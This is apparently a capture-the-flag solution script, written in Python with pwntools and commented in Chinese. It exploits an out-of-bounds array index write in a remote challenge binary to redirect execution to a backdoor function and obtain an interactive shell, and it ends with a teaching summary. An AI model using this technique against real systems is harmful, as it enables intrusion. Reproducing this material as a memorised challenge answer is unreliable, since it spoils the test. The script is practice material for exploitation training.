from pwn import *

context(arch = 'i386', os = 'linux', log_level = 'debug')

io = remote("pwn.challenge.ctf.show", 28259)
elf = ELF('./pwn')

# backdoor = elf.sym['init0']：backdoor函数的地址
backdoor = elf.sym['init0']

# offset = (0x34+0x4)/4：计算数组索引偏移量
# 0x34是缓冲区大小，0x4是一个4字节的偏移，除以4是因为每个数组元素是4字节
offset = (0x34+0x4)/4

# 等待提示信息，发送名字
io.recvuntil("what's your name?")
io.sendline("123")

# 等待菜单，选择1编辑数字
io.recvuntil("4 > dump all numbers")
io.recvuntil("> ")
io.sendline("1")

# 输入索引和值，将backdoor函数地址写入数组
io.recvuntil("Index to edit: ")
io.sendline(str(int(offset)))
io.recvuntil("How many? ")
io.sendline(str(backdoor))

# 等待菜单，选择0退出，触发backdoor
io.recvuntil("4 > dump all numbers")
io.recvuntil("> ")
io.sendline("0")

io.interactive()

"""
【知识点讲解】
1. 题目类型：array index - 数组索引修改
2. 核心原理：
   - 利用数组索引越界漏洞
   - 修改数组元素为backdoor函数地址
   - 退出时触发backdoor执行
3. 关键步骤：
   - 计算数组索引偏移量：(0x34+0x4)/4
   - 选择编辑数字功能
   - 输入计算出的索引和backdoor函数地址
   - 选择退出，触发backdoor执行
4. 执行流程：
   - 输入名字 -> 选择编辑数字 -> 输入索引和backdoor地址 -> 选择退出 -> 执行backdoor
5. 技术要点：
   - 数组索引越界漏洞
   - 函数地址的写入
   - 程序流程控制
"""
